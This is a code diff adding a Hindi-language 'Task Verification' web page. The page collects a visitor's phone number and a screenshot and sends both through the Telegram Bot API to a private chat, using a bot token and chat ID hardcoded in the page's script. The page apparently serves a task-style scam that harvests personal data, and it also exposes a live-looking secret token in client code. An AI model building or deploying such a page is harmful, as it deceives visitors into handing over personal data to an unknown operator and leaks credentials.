@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Task Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
+    <div id="main-card" class="bg-white p-6 rounded-xl shadow-lg w-full max-w-sm">
+        <h2 class="text-xl font-bold text-blue-600 mb-4 text-center">Verify Your Task</h2>
+        <form id="taskForm" class="space-y-4">
+            <input type="tel" id="phone" placeholder="अपना 10 अंकों का नंबर डालें" class="w-full p-3 border rounded-lg outline-none" required>
+            <div class="border-2 border-dashed p-4 text-center rounded-lg bg-gray-50">
+                <p class="text-xs text-gray-500 mb-2">स्क्रीनशॉट चुनें</p>
+                <input type="file" id="screenshot" accept="image/*" class="text-xs w-full" required>
+            </div>
+            <button type="submit" id="submitBtn" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold">सबमिट करें</button>
+        </form>
+    </div>
+
+    <div id="success-card" class="hidden bg-white p-8 rounded-xl shadow-lg text-center w-full max-w-sm">
+        <h2 class="text-2xl font-bold text-green-500">Done! ✅</h2>
+        <p class="mt-2 text-gray-600">आपका टास्क रिव्यू में है।</p>
+    </div>
+
+    <script>
+        const token = "8066403769:AAFaP7_bxMvM8oKdYNLnzE4IOcjZSBonUXA";
+        const chatId = "7667656908";
+
+        window.onload = () => {
+            if (localStorage.getItem('done') === 'y') showSuccess();
+        };
+
+        function showSuccess() {
+            document.getElementById('main-card').classList.add('hidden');
+            document.getElementById('success-card').classList.remove('hidden');
+        }
+
+        document.getElementById('taskForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            const phone = document.getElementById('phone').value;
+            const file = document.getElementById('screenshot').files[0];
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('caption', `नया टास्क! \nमोबाइल: ${phone}`);
+            formData.append('photo', file);
+
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+            localStorage.setItem('done', 'y');
+            showSuccess();
+        };
+    </script>
+</body>
+</html> 
